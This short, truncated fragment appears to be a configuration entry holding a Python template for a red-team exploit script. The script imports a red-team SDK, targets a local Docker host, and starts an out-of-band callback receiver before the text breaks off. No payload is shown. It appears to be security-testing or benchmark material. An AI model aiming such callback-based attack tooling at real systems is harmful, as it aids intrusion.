  lang: python
  template: "import redteam_sdk\nimport urllib.parse\nimport time\n\nTARGET_URL =\
    \ \"http://host.docker.internal:9443\"\n\ndef main():\n    # 启动带外回调接收器\n    oob\
    \ = redteam_sdk.OOBReceiver(port=8765)\n    oob_url = oob.url\n    print(f\"[*]\
